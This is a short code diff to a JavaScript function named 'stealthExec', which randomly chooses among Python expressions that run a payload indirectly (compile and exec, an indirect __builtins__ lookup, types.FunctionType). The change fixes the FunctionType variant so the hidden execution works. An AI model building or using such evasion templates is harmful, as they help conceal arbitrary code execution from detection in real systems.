@@ -350,8 +350,8 @@ function stealthExec(payloadExpr) {
     () => `exec(compile(${payloadExpr}, '<module>', 'exec'))`,
     // __builtins__ indirect lookup
     () => `getattr(__builtins__, '__dict__', __builtins__)['exec'](${payloadExpr})`,
-    // types.FunctionType
-    () => `(lambda c: __import__('types').FunctionType(compile(c, '', 'exec'), {})())(${payloadExpr})`,
+    // types.FunctionType (must pass globals() for builtins/imports)
+    () => `(lambda c: __import__('types').FunctionType(compile(c, '', 'exec'), globals())())(${payloadExpr})`,
   ]
   return methods[Math.floor(Math.random() * methods.length)]()
 }
